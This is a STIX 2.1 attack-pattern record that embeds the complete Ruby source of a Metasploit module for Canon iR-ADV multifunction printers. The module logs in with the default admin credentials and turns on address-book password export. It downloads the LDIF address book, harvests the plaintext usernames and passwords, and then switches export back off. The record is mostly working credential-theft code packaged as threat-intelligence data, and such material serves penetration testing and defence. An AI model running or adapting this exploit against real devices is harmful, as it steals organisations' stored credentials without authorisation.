{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4d976e1-4778-400f-96fa-ea32680bb6c2",
    "created": "2024-08-14T16:27:57.880283Z",
    "modified": "2024-08-14T16:27:57.880288Z",
    "name": "Canon IR-Adv Password Extractor",
    "description": " This module will extract the passwords from address books on various Canon IR-Adv mfp devices. Tested models: iR-ADV C2030 iR-ADV 4045 iR-ADV C5030 iR-ADV C5235 iR-ADV C5240 iR-ADV 6055 iR-ADV C7065 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/printer/canon_iradv_pwd_extract.rb",
            "external_id": "canon_iradv_pwd_extract.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Canon IR-Adv Password Extractor',\n      'Description'    => %q{\n        This module will extract the passwords from address books on various Canon IR-Adv mfp devices.\n        Tested models:\n        iR-ADV C2030,\n        iR-ADV 4045,\n        iR-ADV C5030,\n        iR-ADV C5235,\n        iR-ADV C5240,\n        iR-ADV 6055,\n        iR-ADV C7065\n      },\n      'Author'         =>\n        [\n          'Deral \"Percentx\" Heiland',\n          'Pete \"Bokojan\" Arzamendi',\n          'wvu',\n          'Dev Mohanty'\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptBool.new('SSL', [true, \"Negotiate SSL for outgoing connections\", false]),\n        OptInt.new('ADDRSBOOK', [ true, 'The number of the address book to extract 1-11', 1]),\n        Opt::RPORT(8000),\n        OptString.new('USER', [ true, 'The default Admin user', '7654321']),\n        OptString.new('PASSWD', [ true, 'The default Admin password', '7654321']),\n        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])\n\n      ])\n  end\n\n  def run_host(ip)\n    print_status(\"Attempting to extract passwords from the address books on the MFP at #{rhost}\")\n    login(ip)\n  end\n\n#Authenticate to management function on Canon MFP and build needed cookies for dta harvesting\n  def login(ip)\n    vars_post = {\n      \"uri\" => \"%2f\",\n      \"deptid\" => \"#{datastore['USER']}\",\n      \"password\" => \"#{datastore['PASSWD']}\"\n    }\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => normalize_uri('/login'),\n        'vars_post' => vars_post\n      }, datastore['TIMEOUT'].to_i)\n    end\n\n    #grab Canon sessionid cookie\n    idcookie = res.nil? ? nil : res.get_cookies\n\n    if res && (res.code == 301 || res.code == 302 && res.headers.include?('Location'))\n      print_good(\"#{rhost} - SUCCESSFUL login with USER='#{datastore['USER']}' : PASSWORD='#{datastore['PASSWD']}'\")\n\n      #grab Canon IR= session cookie\n      res = send_request_cgi({\n        'method'  => 'GET',\n        'uri'     => normalize_uri('/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064'),\n        'headers' => {'Cookie' => \"#{idcookie}\"},\n      }, datastore['TIMEOUT'].to_i)\n      ircookie = res.nil? ? nil : res.get_cookies\n      cookies=(\"#{idcookie}; #{ircookie}\")\n\n      set_allow(cookies)\n      extract(cookies, ip)\n      set_disallow(cookies)\n\n    else\n      print_error(\"Failed to login on #{rhost}. Please check the password for the #{datastore['USER']} account \")\n    end\n  end\n\n\n  # Set the allow password export to on\n  def set_allow(cookies)\n    vars_post = {\n      \"ADRSEXPPSWDCHK\" => \"0\",\n      \"PageFlag\" => \"c_adrs.tpl\",\n      \"Flag\" => \"Exec_Data\",\n      \"CoreNXAction\" => \"./cadrs.cgi\",\n      \"CoreNXPage\" => \"c_adrexppass.tpl\",\n      \"CoreNXFlag\" => \"Init_Data\",\n      \"Dummy\" => \"1359048058115\"\n    }\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => normalize_uri('/rps/cadrs.cgi'),\n        'vars_post' => vars_post,\n        'headers' => {'Cookie' => \"#{cookies}\"},\n      }, datastore['TIMEOUT'].to_i)\n    end\n  end\n\n  # Extract the address book data and save out to loot\n  def extract(cookies, ip)\n    vars_post = {\n      \"AID\" => \"#{datastore['ADDRSBOOK']}\",\n      \"ACLS\" => \"1\",\n      \"ENC_MODE\" => \"0\",\n      \"ENC_FILE\" => \"password\",\n      \"PASSWD\" => \"\",\n      \"PageFlag\" => \"\",\n      \"AMOD\" => \"\",\n      \"Dummy\" => \"1359047882596\",\n      \"ERR_PG_KIND_FLG\" => \"Adress_Export\"\n    }\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri('/rps/abook.ldif'),\n      'vars_post' => vars_post,\n      'headers' => {'Cookie' => \"#{cookies}\"},\n    }, datastore['TIMEOUT'].to_i)\n    address_book = res.nil? ? nil : res.body\n    print_status(\"#{address_book}\")\n\n    #Woot we got loot.\n    loot_name     = \"canon.iradv.addressbook\"\n    loot_type     = \"text/plain\"\n    loot_filename = \"Canon-addressbook.text\"\n    loot_desc     = \"Canon Addressbook Harvester\"\n    p = store_loot(loot_name, loot_type, datastore['RHOST'], address_book , loot_filename, loot_desc)\n    print_good(\"Credentials saved in: #{p}\")\n\n    harvest_ldif(address_book, ip)\n  end\n\n# Reset the allow password export to off\n  def set_disallow(cookies)\n    vars_post = {\n      \"ADRSEXPPSWDCHK\" => \"1\",\n      \"PageFlag\" => \"c_adrs.tpl\",\n      \"Flag\" => \"Exec_Data\",\n      \"CoreNXAction\" => \"./cadrs.cgi\",\n      \"CoreNXPage\" => \"c_adrexppass.tpl\",\n      \"CoreNXFlag\" => \"Init_Data\",\n      \"Dummy\" => \"1359048058115\"\n    }\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri('/rps/cadrs.cgi'),\n      'vars_post' => vars_post,\n      'headers' => {'Cookie' => \"#{cookies}\"},\n    }, datastore['TIMEOUT'].to_i)\n  end\n\n  # Harvest Credential\n  def harvest_ldif(address_book, ip)\n    harvest_file(address_book, ip)\n  end\n\n  def harvest_credentials(mailaddress, pwd, ip)\n    return if mailaddress == nil\n    username_domain = mailaddress.split('@')\n    username = username_domain[0]\n    domain = username_domain[1]\n\n    service_data = {\n        address: Rex::Socket.getaddress(ip),\n        port: rport,\n        protocol: 'tcp',\n        service_name: ssl ? 'https' : 'http',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        origin_type: :service,\n        module_fullname: self.fullname,\n        username: username,\n        private_data: pwd,\n        private_type: :password\n    }\n\n    create_credential(credential_data.merge(service_data))\n\n    print_good \"Domain: #{domain}\\nUser: #{username}\\nPassword: #{pwd}\\n\\r\"\n  end\n\n  def harvest_file(ldif, ip)\n    users = []\n    ldif.split(\"\\r\\n\\r\\n\").each do |user|\n      user_attributes = {}\n      user.split(\"\\r\\n\").each do |attribute|\n        attribute_array = attribute.split(\": \")\n        attr_name = attribute_array.shift\n        attr_value = attribute_array.join\n        user_attributes[attr_name] = attr_value\n      end\n      harvest_credentials((user_attributes['username'] || user_attributes['mailaddress'] || user_attributes['mail']), user_attributes['pwd'], ip)\n      users << user_attributes\n    end\n  end\nend\n"
}